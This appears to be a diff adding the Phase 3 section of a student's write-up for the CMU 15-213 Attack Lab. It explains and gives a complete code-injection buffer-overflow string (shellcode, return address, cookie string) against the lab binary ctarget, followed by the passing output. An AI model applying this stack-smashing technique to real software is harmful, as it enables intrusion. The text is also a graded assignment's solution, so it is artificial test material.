@@ -124,3 +124,48 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:2:48 83 EC 18 BF FA 97 B9 59 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C3 EC 17 40 00 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 78 DC 61 55 00 00 00 00
 ```
+
+## PHASE 3
+
+Phase 3 is very similar to phase 2, but instead of passing the parameter directly, we need to pass the pointer, that points to the string representation of cookie.
+
+By analogy, we need to inject the code like:
+```assembly
+subq $0x18, %rsp
+movq $<some address>, %rdi
+nop
+nop
+... (11 more times)
+nop
+ret
+```
+
+The main difficulty here is where we need to inject the string representation of cookie. It can't be the stack frame of `getbuf` function because it will be overwritten by `hexmatch` function since the stack frame of `getbuf` will be used by this function or by the `touch3` function (I don't care). So let's put the string representation of the cookie faaar away. I think the address of `0x5561dd00` is far enough.
+
+The string (char byte sequence) representation of the cookie (`59b997fa`) is `35 39 62 39 39 37 66 61` in hexadecimal representation according to the ASCII table.
+
+The address of the `touch3` function is `0x4018fa`.
+
+So, by the analogy with phase 2 solution, the answer is going to be:
+
+```
+48 83 ec 18 bf 00 dd 61 55 90 90 90 90 90 90 90 90 90 90 90 90 90 90 c3 fa 18 40 00 00 00 00 00 3f 3f 3f 3f 3f 3f 3f 3f 78 dc 61 55 00 00 00 00 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 35 39 62 39 39 37 66 61
+```
+
+Let's check.
+```bash
+attack-lab / % ./hex2raw < solutions/phase3/phase3_bytes.txt > solutions/phase3/phase3_raw.txt
+attack-lab / % ./ctarget -q -i solutions/phase3/phase3_raw.txt
+```
+
+Passed.
+```
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 83 EC 18 BF 00 DD 61 55 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C3 FA 18 40 00 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 78 DC 61 55 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 35 39 62 39 39 37 66 61
+```
